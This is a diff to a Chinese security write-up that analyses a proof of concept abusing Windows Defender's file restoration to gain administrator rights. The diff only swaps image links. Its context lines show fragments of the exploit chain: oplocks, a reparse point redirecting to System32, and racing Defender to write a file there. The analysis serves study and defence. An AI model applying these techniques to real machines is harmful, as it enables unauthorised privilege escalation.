@@ -75,7 +75,7 @@ previous_primary_identifiers: ""
 > 当 Windows Defender 识别出某个恶意文件带有“云标签”时，出于某种极其愚蠢且荒谬的原因，这款本该负责防护的杀毒软件竟然会自作聪明地决定：把刚刚发现的这个文件原封不动地重写回其原始位置。而这个 PoC 正是利用了这一反常行为，通过覆盖系统文件来获取管理员权限。[2]  
   
   
-![image-20260502145007748](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu8EhdaoOzFbM28UWGH5s6DdvPElKzdNCyahGrib9Jn50f2loACzJwXKEGX1SMsbrMd2ibcoWFRU9lNNVibk4G8TbkMXDViaicQznzDE/640?wx_fmt=png&from=appmsg "")  
+![image-20260502145007748](../../.resource/remote/6da3272c74757fd5772b8e8ad5fd3d4cb0182df2f725a00a9681229ea42e25b3.png "")  
   
 **PoC地址**  
 - 原始PoC[1]:   
@@ -150,7 +150,7 @@ static std::vector<std::pair<std::wstring, std::wstring>> enum_directory(const s
 }
 ```  
   
-![image-20260502204121740](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuibfnKOmDgxXu0KuibG1VGBT2EM1kpC2M2f3GpBXcuRnJrnoa7AIeTdIdvL0r9WicEsgUdWWaJdT1cicgT2SNsAmRTOsXkD9KUFiaD0/640?wx_fmt=png&from=appmsg "")  
+![image-20260502204121740](../../.resource/remote/b9c6783faf0e84b976ab60acd73ad9b7587d59db3522c9a42adf078248cbe58f.png "")  
 ## Volume Shadow Copy Service (Windows VSS)  
 > Volume Shadow Copy Service（简称 VSS）是 Microsoft Windows 操作系统内置的数据备份框架，用于在应用程序运行时创建一致性的磁盘卷快照（shadow copy）。它支撑了系统还原、文件历史版本及多种备份软件，是 Windows 数据保护机制的核心组成部分。[3]  
   
@@ -280,11 +280,11 @@ C://test/
 中只存在  
 demo.txt  
   
-![image-20260502214442388](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuibyBY6sxnTTFztYsPggib3UHFgjrDo64t8KazU7EkkHGSLEpRbUsM6oZYbeJgWZuLGibahCNMPsOm1FegehvfribuSib9985RRbQ8c/640?wx_fmt=png&from=appmsg "")  
+![image-20260502214442388](../../.resource/remote/6ceed319c84713a51e2019cb522ee6d8e69a30ccd0c7f89ef159025bc99179e6.png "")  
   
 在管理员模式下运行程序后，成功地从VSS中恢复了原始文件的内容。  
   
-![image-20260502214610317](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3Rpuic5gOl2M5FiaFiaROTrqZMyISV4E4hSibxW04M0Z7phM29hBb4JwnicESAhzDaj3YoCBHwpg8f4ze8mAs8eImicibqI58nTSjr5unuia0/640?wx_fmt=png&from=appmsg "")  
+![image-20260502214610317](../../.resource/remote/037ccb99fda402a452551ad6d592912674bfe6b8d5fc82d20819813bfc6d87f6.png "")  
 ## 云同步目录  
 > 从 Windows 10 版本 1709 开始，Windows 提供   
 云文件 API  
@@ -293,7 +293,7 @@ demo.txt
   
 使用类似PoC中的代码创建云同步目录会发现由于占位符的存在，无法对其中的文件进行操作。  
   
-![image-20260503202047072](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuicKxbn7F012wVPiaHLhhlXgVukBDia5ymu3eMhnXfGyEGaPXwHickUfoicaDicyWGeR7CWTAJYEib3Xd42Q7gdYIiaLQiaEyc74VEcYNQM/640?wx_fmt=png&from=appmsg "")  
+![image-20260503202047072](../../.resource/remote/496a53e5eb6b01fcf22a9e1d046a85197ba061fb98b426b5b8d2a373cac892ed.png "")  
 # PoC分析  
   
 来源：  
@@ -688,11 +688,11 @@ ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 SetEvent(gevent);
 ```  
   
-![image-20260503171952696](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuicqVUJ5Y4OcN3ZaDWmA7FiaZsDCOV4D2X1eZJY3frAmm2sbXLf33nTakZa5yQPlsoUu7LY18PTo26IszFuROyQbIQyrUaYVKjMQ/640?wx_fmt=png&from=appmsg "")  
+![image-20260503171952696](../../.resource/remote/9a1738fa7a0a3d386c1727d6a2790c6b50a4370d0b04c1f5548d9db7b53ae787.png "")  
   
-![image-20260503172004226](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuicgEgZ5EicIDELfNdD5sCPGcDPCGUibSvCh6dcl9uib3vIUpSzRcJ11Vv6Kj33ZAc5WFRwQrGWPkBkmm3X03UoVKTMfnzKRYt87Ik/640?wx_fmt=png&from=appmsg "")  
+![image-20260503172004226](../../.resource/remote/b00e86dc739ed4e09cd098d1fb2ce8b35e96c3ad3abd3de21791017c3f3a0cae.png "")  
   
-![image-20260503172235986](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu9icf4oG6JLh4ypOOgQyT3wXgyeJ35OY212KhJMwd4h95UcRGRKvxDrkgqfA6QsORzBn5y1zW5W1n4CxX3OYiaRjDA30x51PRqt0/640?wx_fmt=png&from=appmsg "")  
+![image-20260503172235986](../../.resource/remote/c08a370c6472e7db86c2e78c3439853e1e59c59fce54f99b1b6dade73eb085e1.png "")  
 ### 5. 唤醒主线程  
   
 ShadowCopyFinderThread  
@@ -746,7 +746,7 @@ DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL,
 GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
 ```  
   
-![image-20260503190748268](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3Rpu9zpT1BggZgv4uMtarNTZ6j0PPNFXc7BPCicmGWjAXQdk4k95xibkOBaIwImATE4GkTqEVbwXQ8Pa9QSWHwHficF72QULwvqPGYy0/640?wx_fmt=png&from=appmsg "")  
+![image-20260503190748268](../../.resource/remote/fecf08a37c27cdc6d0c1d2b17d901876dec394c0378a4bbf4fb35e2317759c1f.png "")  
 ### 7. 再次oplock  
   
 在等待再次访问exe的时候将文件映射到内存（只读），如果要写入的话会失败。通过文件映射固定住文件数据区，确保在 oplock 等待期间文件不会被系统回收；oplock 触发后立即释放，为后面的重命名+删除操作腾路。  
@@ -805,7 +805,7 @@ stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &io
 //...
 ```  
   
-![image-20260503191706924](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3Rpu8nkpRWX1EJU428LprRrgttycu9btwPbBnRfIHo3zj0ba72jOILrveu0wO0cjlz8svKM9xf4d5vzdaqPBdXcV1H3ibmJia5Tpib0c/640?wx_fmt=png&from=appmsg "")  
+![image-20260503191706924](../../.resource/remote/ab949e33ec12e4d20b726092cd9551f975975213782eddfccbae50a512df8eac.png "")  
 ### 8. 修改文件夹属性为重定向  
 ```
 wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
@@ -828,7 +828,7 @@ DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NU
 HeapFree(GetProcessHeap(), NULL, rdb);
 ```  
   
-![image-20260503193103091](https://mmbiz.qpic.cn/mmbiz_png/bz5OjA3RpuibswW4ScSRnibhLZfIKASb8xa12Revaw5bsqvBlbtEbIib4BC8X5sPaQJg5FObI5y5akcNkzZNhyezWTYAsllx303ic8feqicbR0GI/640?wx_fmt=png&from=appmsg "")  
+![image-20260503193103091](../../.resource/remote/98c80482580b2954a2b96451764bfe96cb6e28672588d14a9b0f0a1c0781b195.png "")  
 ### 9. 写入文件到System32  
   
 首先关闭hFile的句柄导致之前的".TMP2"的文件删除，然后同windows defender进行竞争，竞争成功时拿到System32目录下  
@@ -899,7 +899,7 @@ void LaunchTierManagementEng()
 }
 ```  
   
-![image-20260503201634838](https://mmbiz.qpic.cn/sz_mmbiz_png/bz5OjA3RpuibG1n5TKYktpVQnt9fSQiblbWWicf9G5GqVXByN97D0qpBXOUSwqgx69JicM9HibhgfM6Mct7YstiadV2JT7jkE0jCrpqPH2z29iap8c/640?wx_fmt=png&from=appmsg "")  
+![image-20260503201634838](../../.resource/remote/f93e5783331fa89d2bdd03e9c8f02e0258dec91f894020e31ed2d1f63c6f494a.png "")  
 # 应用  
   
 [1]   
